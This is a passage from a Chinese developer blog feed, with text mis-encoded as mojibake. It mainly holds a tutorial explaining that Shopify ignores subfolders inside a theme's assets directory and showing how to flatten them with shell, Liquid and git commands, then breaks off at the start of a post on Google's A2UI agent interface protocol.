<p>å»ºè®®å…ˆä»æœ€å½±å“æ€§èƒ½çš„åœ°æ–¹å¼€å§‹æ·»åŠ é˜²æŠ–ï¼Œé€æ­¥æ‰©å±•åˆ°å…¶ä»–äº‹ä»¶ï¼ŒåŒæ—¶æ³¨æ„æµ‹è¯•ä¸åŒè®¾å¤‡ä¸Šçš„è¡¨ç°ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[shopify ä»githubè·å–ä¸»é¢˜æ–‡ä»¶æ—¶ï¼Œassetsæ–‡ä»¶ä¸­çš„å­æ–‡ä»¶å¤¹æœªè·å–åˆ°]]></title>    <link>https://juejin.cn/post/7596883689827074111</link>    <guid>https://juejin.cn/post/7596883689827074111</guid>    <pubDate>2026-01-19T12:12:05.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7596883689827074111" data-draft-id="7596926832912531519" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="shopify ä»githubè·å–ä¸»é¢˜æ–‡ä»¶æ—¶ï¼Œassetsæ–‡ä»¶ä¸­çš„å­æ–‡ä»¶å¤¹æœªè·å–åˆ°"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2026-01-19T12:12:05.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="mrleolg"/> <meta itemprop="url" content="https://juejin.cn/user/4318537403346743"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            shopify ä»githubè·å–ä¸»é¢˜æ–‡ä»¶æ—¶ï¼Œassetsæ–‡ä»¶ä¸­çš„å­æ–‡ä»¶å¤¹æœªè·å–åˆ°
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4318537403346743/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    mrleolg
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-19T12:12:05.000Z" title="Mon Jan 19 2026 12:12:05 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-19
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>ä» GitHub åŒæ­¥ Shopify ä¸»é¢˜ä»£ç æ—¶ï¼Œ<code>assets</code> æ–‡ä»¶å¤¹ä¸‹çš„å­æ–‡ä»¶å¤¹ï¼ˆæ¯”å¦‚ <code>assets/images/</code>ã€<code>assets/icons/</code>ï¼‰æ²¡æœ‰è¢«åŒæ­¥åˆ° Shopify åº—é“ºï¼Œè¿™å¹¶é GitHub åŒæ­¥çš„é—®é¢˜ï¼Œè€Œæ˜¯ <strong>Shopify ä¸»é¢˜ç³»ç»Ÿçš„åº•å±‚é™åˆ¶</strong> â€”â€” Shopify ä¸æ”¯æŒ <code>assets</code> æ–‡ä»¶å¤¹ä¸‹çš„åµŒå¥—å­æ–‡ä»¶å¤¹ï¼Œåªä¼šè¯†åˆ« <code>assets</code> æ ¹ç›®å½•ä¸‹çš„æ–‡ä»¶ï¼Œå­æ–‡ä»¶å¤¹åŠå…¶ä¸­çš„å†…å®¹ä¼šè¢«ç›´æ¥å¿½ç•¥ã€‚</p>
<h3 data-id="heading-0">ä¸€ã€æ ¸å¿ƒåŸå› ï¼šShopify å¯¹ assets æ–‡ä»¶å¤¹çš„å¼ºåˆ¶è§„åˆ™</h3>
<p>Shopify ä¸»é¢˜çš„ <code>assets</code> ç›®å½•æ˜¯ç‰¹æ®Šçš„é™æ€èµ„æºç›®å½•ï¼Œæœ‰ä¸¥æ ¼é™åˆ¶ï¼š</p>
<ul>
<li>âœ… ä»…è¯†åˆ« <code>assets</code> <strong>æ ¹ç›®å½•</strong> ä¸‹çš„æ–‡ä»¶ï¼ˆå¦‚ <code>assets/banner.jpg</code>ã€<code>assets/cart-icon.svg</code>ï¼‰ï¼›</li>
<li>âŒ å®Œå…¨å¿½ç•¥ <code>assets</code> ä¸‹çš„æ‰€æœ‰å­æ–‡ä»¶å¤¹ï¼ˆå¦‚ <code>assets/images/</code>ã€<code>assets/css/</code>ã€<code>assets/icons/</code>ï¼‰ï¼ŒåŒæ­¥æ—¶ä¸ä¼šè¯»å–è¿™äº›å­æ–‡ä»¶å¤¹é‡Œçš„ä»»ä½•æ–‡ä»¶ã€‚</li>
</ul>
<p>è¿™å°±æ˜¯ä¸ºä»€ä¹ˆ GitHub ä»“åº“é‡Œæœ‰ <code>assets/images/banner.jpg</code>ï¼Œä½†åŒæ­¥åˆ° Shopify åå´çœ‹ä¸åˆ°çš„åŸå›  â€”â€” Shopify ç›´æ¥è·³è¿‡äº† <code>images</code> å­æ–‡ä»¶å¤¹ã€‚</p>
<h3 data-id="heading-1">äºŒã€è§£å†³æ–¹æ¡ˆï¼šæ‰å¹³åŒ– assets ç»“æ„ï¼ˆå”¯ä¸€å¯è¡Œæ–¹æ¡ˆï¼‰</h3>
<p>éœ€è¦è°ƒæ•´ GitHub ä»“åº“çš„æ–‡ä»¶ç»“æ„ï¼Œå°†å­æ–‡ä»¶å¤¹é‡Œçš„å›¾ç‰‡ / æ–‡ä»¶ç§»åˆ° <code>assets</code> æ ¹ç›®å½•ï¼Œå¹¶ç”¨<strong>å‘½åå‰ç¼€</strong>åŒºåˆ†åŸåˆ†ç±»ï¼ˆæ¯”å¦‚ <code>images/banner.jpg</code> â†’ <code>banner-image.jpg</code>ï¼‰ï¼Œå…·ä½“æ­¥éª¤å¦‚ä¸‹ï¼š</p>
<h4 data-id="heading-2">1. æœ¬åœ°è°ƒæ•´æ–‡ä»¶ç»“æ„</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 1. è¿›å…¥æœ¬åœ° Shopify ä¸»é¢˜ç›®å½• </span>
<span class="hljs-built_in">cd</span> /ä½ çš„æœ¬åœ°ä¸»é¢˜è·¯å¾„ 

<span class="hljs-comment"># 2. å°† assets/images ä¸‹çš„æ–‡ä»¶ç§»åˆ° assets æ ¹ç›®å½•ï¼Œå¹¶é‡å‘½åï¼ˆåŠ å‰ç¼€åŒºåˆ†ï¼‰ </span>
<span class="hljs-built_in">mv</span> assets/images/banner.jpg assets/banner-image.jpg 
<span class="hljs-built_in">mv</span> assets/images/product-card.png assets/product-card-image.png

<span class="hljs-comment"># 3. åˆ é™¤ç©ºçš„å­æ–‡ä»¶å¤¹ï¼ˆå¯é€‰ï¼‰ </span>
<span class="hljs-built_in">rm</span> -rf assets/images

</code></pre>
<h4 data-id="heading-3">2. ä¿®æ­£ Liquid ä¸­çš„å›¾ç‰‡å¼•ç”¨è·¯å¾„</h4>
<pre><code class="hljs language-liquid" lang="liquid">å› ä¸ºæ–‡ä»¶è·¯å¾„å˜äº†ï¼Œéœ€è¦åŒæ­¥ä¿®æ”¹ Liquid é‡Œçš„ `asset_url` å¼•ç”¨ï¼š

&lt;!-- åŸé”™è¯¯å†™æ³•ï¼ˆå¼•ç”¨å­æ–‡ä»¶å¤¹ï¼‰ --&gt; 
&lt;img src="{{ 'images/banner.jpg' | asset_url }}" alt="banner"&gt; 

&lt;!-- æ–°æ­£ç¡®å†™æ³•ï¼ˆæ‰å¹³åŒ–åï¼‰ --&gt; 
&lt;img src="{{ 'banner-image.jpg' | asset_url }}" alt="banner"&gt;

</code></pre>
<ol start="3">
<li>æ¨é€åˆ° GitHub å¹¶é‡æ–°åŒæ­¥åˆ° Shopify</li>
</ol>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 1. æäº¤æ–‡ä»¶ç»“æ„ä¿®æ”¹åˆ° GitHub </span>
git add assets/ git commit -m <span class="hljs-string">"fix: æ‰å¹³åŒ–assetsæ–‡ä»¶å¤¹ï¼Œé€‚é…Shopifyè§„åˆ™"</span> 
git push origin main 

<span class="hljs-comment"># 2. ç”¨ Shopify CLI é‡æ–°åŒæ­¥åˆ°åº—é“ºï¼ˆå¼ºåˆ¶è¦†ç›–ï¼‰ </span>
shopify theme push --force

</code></pre>
<h4 data-id="heading-4">4. éªŒè¯æ˜¯å¦åŒæ­¥æˆåŠŸ</h4>
<ul>
<li>æ‰“å¼€ GitHub ä»“åº“ï¼Œç¡®è®¤ <code>assets</code> æ ¹ç›®å½•ä¸‹æœ‰é‡å‘½ååçš„å›¾ç‰‡æ–‡ä»¶ï¼ˆå¦‚ <code>banner-image.jpg</code>ï¼‰ï¼›</li>
<li>è¿›å…¥ Shopify åå° â†’ åœ¨çº¿å•†åº— â†’ ä¸»é¢˜ â†’ ç¼–è¾‘ä»£ç  â†’ å·¦ä¾§ <code>Assets</code> æ–‡ä»¶å¤¹ï¼Œèƒ½çœ‹åˆ°è¿™äº›æ–‡ä»¶å³åŒæ­¥æˆåŠŸï¼›</li>
<li>åˆ·æ–°åº—é“ºé¡µé¢ï¼Œå›¾ç‰‡å³å¯æ­£å¸¸æ˜¾ç¤ºã€‚</li>
</ul>
<h3 data-id="heading-5">ä¸‰ã€è¿›é˜¶ä¼˜åŒ–ï¼šä¿æŒæœ¬åœ°å¼€å‘çš„æ–‡ä»¶å¤¹ç»“æ„ï¼ˆå¯é€‰ï¼‰</h3>
<p>å¦‚æœæœ¬åœ°å¼€å‘æ—¶æƒ³ä¿ç•™ <code>assets/images/</code> ç­‰å­æ–‡ä»¶å¤¹ï¼ˆæ–¹ä¾¿åˆ†ç±»ç®¡ç†ï¼‰ï¼Œå¯é€šè¿‡ <strong>æ„å»ºè„šæœ¬</strong> è‡ªåŠ¨æ‰å¹³åŒ–æ–‡ä»¶ï¼Œé¿å…æ‰‹åŠ¨é‡å‘½åï¼š</p>
<ol>
<li>æœ¬åœ°åˆ›å»º <code>scripts/build-assets.sh</code> è„šæœ¬ï¼š</li>
</ol>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash </span>
<span class="hljs-comment"># è‡ªåŠ¨å°† assets/*/ ä¸‹çš„æ–‡ä»¶å¤åˆ¶åˆ° assets æ ¹ç›®å½•ï¼ŒåŠ å‰ç¼€ </span>
<span class="hljs-built_in">cp</span> assets/images/*.jpg assets/ --suffix=-image 
<span class="hljs-built_in">cp</span> assets/icons/*.svg assets/ --suffix=-icon

</code></pre>
<ol start="2">
<li>å¼€å‘å®Œæˆåï¼Œå…ˆæ‰§è¡Œè„šæœ¬æ‰å¹³åŒ–æ–‡ä»¶ï¼Œå†æäº¤åˆ° GitHubï¼š</li>
</ol>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æ‰§è¡Œè„šæœ¬ </span>
bash scripts/build-assets.sh 

<span class="hljs-comment"># æäº¤åˆ° GitHub </span>
git add assets/ 
git commit -m <span class="hljs-string">"build: æ‰å¹³åŒ–assetsæ–‡ä»¶"</span> 
git push origin main

</code></pre>
<h3 data-id="heading-6">å››ã€å…³é”®æ³¨æ„äº‹é¡¹</h3>
<ol>
<li><strong>ç¦æ­¢åœ¨ assets å»ºå­æ–‡ä»¶å¤¹</strong>ï¼šè¿™æ˜¯ Shopify çš„ç¡¬è§„åˆ™ï¼Œæ— è®ºé€šè¿‡ GitHub åŒæ­¥è¿˜æ˜¯æ‰‹åŠ¨ä¸Šä¼ ï¼Œå­æ–‡ä»¶å¤¹éƒ½ä¸ä¼šè¢«è¯†åˆ«ï¼›</li>
<li><strong>å‘½åè§„èŒƒ</strong>ï¼šæ‰å¹³åŒ–åæ–‡ä»¶å‘½åç”¨ã€ŒåŠŸèƒ½ + ç±»å‹ + åç¼€ã€ï¼ˆå¦‚ <code>product-card-image.jpg</code>ï¼‰ï¼Œé¿å…é‡åï¼›</li>
<li><strong>æ‰¹é‡å¤„ç†</strong>ï¼šè‹¥æœ‰å¤§é‡å­æ–‡ä»¶å¤¹æ–‡ä»¶ï¼Œå¯æ‰¹é‡é‡å‘½åï¼ˆå¦‚ç”¨ Python/Shell è„šæœ¬ï¼‰ï¼Œé¿å…æ‰‹åŠ¨æ“ä½œå‡ºé”™ï¼›</li>
<li><strong>ç¬¬ä¸‰æ–¹å·¥å…·åŒæ­¥</strong>ï¼šè‹¥ç”¨ Syncifyã€Gitify ç­‰å·¥å…·åŒæ­¥ï¼ŒåŒæ ·éµå¾ªæ­¤è§„åˆ™ â€”â€” ä»…åŒæ­¥ assets æ ¹ç›®å½•æ–‡ä»¶ã€‚</li>
</ol>
<h3 data-id="heading-7">æ€»ç»“</h3>
<ol>
<li>Shopify ä¸æ”¯æŒ <code>assets</code> æ–‡ä»¶å¤¹ä¸‹çš„å­æ–‡ä»¶å¤¹ï¼Œæ˜¯å›¾ç‰‡æ— æ³•åŒæ­¥çš„æ ¸å¿ƒåŸå› ï¼›</li>
<li>å”¯ä¸€è§£å†³æ–¹æ¡ˆæ˜¯<strong>æ‰å¹³åŒ– assets ç»“æ„</strong>ï¼šå°†å­æ–‡ä»¶å¤¹æ–‡ä»¶ç§»åˆ° assets æ ¹ç›®å½•ï¼Œç”¨å‘½åå‰ç¼€åŒºåˆ†åˆ†ç±»ï¼›</li>
<li>ä¿®æ­£ Liquid ä¸­çš„ <code>asset_url</code> å¼•ç”¨è·¯å¾„ï¼Œé‡æ–°æ¨é€ GitHub å¹¶åŒæ­¥åˆ° Shopify å³å¯è§£å†³å›¾ç‰‡ä¸æ˜¾ç¤ºé—®é¢˜ã€‚</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[A2UIåè®®ï¼šä¸€ä¸ªAgentä¸UIç•Œé¢ä¹‹é—´çš„ç¿»è¯‘å™¨]]></title>    <link>https://juejin.cn/post/7596975035437760521</link>    <guid>https://juejin.cn/post/7596975035437760521</guid>    <pubDate>2026-01-20T01:53:23.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7596975035437760521" data-draft-id="7596975035437744137" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="A2UIåè®®ï¼šä¸€ä¸ªAgentä¸UIç•Œé¢ä¹‹é—´çš„ç¿»è¯‘å™¨"/> <meta itemprop="keywords" content="Agent,LLM,Gemini"/> <meta itemprop="datePublished" content="2026-01-20T01:53:23.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ·±åº¦å­¦ä¹ æœºå™¨"/> <meta itemprop="url" content="https://juejin.cn/user/486421344552179"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            A2UIåè®®ï¼šä¸€ä¸ªAgentä¸UIç•Œé¢ä¹‹é—´çš„ç¿»è¯‘å™¨
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/486421344552179/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ·±åº¦å­¦ä¹ æœºå™¨
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T01:53:23.000Z" title="Tue Jan 20 2026 01:53:23 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ä¸€ã€èŠå¤©æ¨¡å¼åœ¨Agentåº”ç”¨ä¸­çš„å±€é™æ€§</h2>
<p>å¦‚æœä½ å¯¹AI Agentæœ‰æ‰€äº†è§£ï¼Œä¸€å®šä¼šæœ‰ä¸€ä¸ªå¼ºçƒˆçš„æ„Ÿå—ï¼Œéšç€LLMèƒ½åŠ›è¶Šæ¥è¶Šå¼ºï¼Œç”Ÿæ€è¶Šæ¥è¶Šä¸°å¯Œï¼ŒAgentä¹Ÿè¶Šæ¥è¶Šèªæ˜ï¼Œä½†ç”¨æˆ·äº¤äº’æ–¹å¼å´è¿˜åœç•™åœ¨æœ€åŸºç¡€çš„èŠå¤©æ¡†æ¨¡å¼ã€‚</p>
<p>æ— è®ºæ˜¯ LangChainã€LangGraphï¼Œè¿˜æ˜¯ AutoGenæˆ–è€…å…¶ä»–Agentæ¡†æ¶ï¼Œæˆ‘ä»¬å·²ç»å¯ä»¥æ„å»ºå…·å¤‡è§„åˆ’ã€è®°å¿†ã€å·¥å…·è°ƒç”¨èƒ½åŠ›çš„ Agentã€‚ä½†å½“ä»»åŠ¡ä¸€æ—¦æ¶‰åŠç”¨æˆ·è¾“å…¥å¤šä¸ªå­—æ®µã€é€‰æ‹©é…ç½®ã€åˆ†æ­¥éª¤æ“ä½œæ—¶ï¼ŒAgent å¾€å¾€ä¼šé€€åŒ–æˆè¾“å‡ºä¸€å¤§æ®µè¯´æ˜æ–‡å­—ï¼Œç„¶åå†ç”±ç”¨æˆ·æ‰‹åŠ¨å»å¡«å†™ã€é€‰æ‹©æˆ–è€…è¿›è¡Œå…·ä½“çš„æ“ä½œã€‚å¯¹äºAgentå’Œç”¨æˆ·è€Œè¨€ï¼Œå­˜åœ¨ç€å¤©ç„¶çš„äº¤äº’å£å’ï¼ŒGoogleåœ¨å»å¹´å¹´åº•æå‡ºå¹¶å¼€æºçš„ A2UIï¼ˆAgent-to-User Interfaceï¼‰ï¼Œæœ¬è´¨ä¸Šå°±æ˜¯ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œå…è®¸è®© Agent ç›´æ¥ç”Ÿæˆç•Œé¢ï¼Œè€Œä¸ä»…ä»…æ˜¯æ–‡æœ¬ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e0ee8243db17482fa8e4027287f2d6db~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rex5bqm5a2m5Lmg5py65Zmo:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769478802&amp;x-signature=F2NVLOmDlHiC0L%2FCFDNUjpKV1ys%3D" alt="" loading="lazy"/></p>
